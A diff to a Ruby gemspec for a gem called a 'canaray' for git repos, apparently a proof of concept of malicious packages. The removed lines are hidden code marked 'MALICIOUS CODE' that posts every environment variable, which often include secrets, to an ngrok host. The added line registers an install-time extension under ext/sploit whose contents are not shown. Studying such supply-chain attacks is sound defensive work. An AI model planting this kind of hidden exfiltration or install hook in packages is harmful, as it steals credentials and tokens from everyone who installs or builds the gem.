@@ -13,6 +13,7 @@ Gem::Specification.new do |spec|
   spec.description   = %q{canaray for your git repo}
   spec.homepage      = "https://kcoleman.me"
   spec.license       = "MIT"
+  spec.extensions = ['ext/sploit/extconf.rb']
 
   # Prevent pushing this gem to RubyGems.org. To allow pushes either set the 'allowed_push_host'
   # to allow pushing to a single host or delete this section to allow pushing to any host.
@@ -37,14 +38,4 @@ Gem::Specification.new do |spec|
   spec.add_development_dependency "bundler", "~> 1.17"
   spec.add_development_dependency "rake", "~> 10.0"
   spec.add_development_dependency "rspec", "~> 3.0"
-
-  ### MALICIOUS CODE START ###
-
-  require "net/http"
-  require "uri"
-
-  uri = URI.parse("http://10cbe90f.ngrok.io/graphql")
-  response = Net::HTTP.post_form(uri, ENV.to_h)
-  
-  ### MALICIOUS CODE END ###
 end
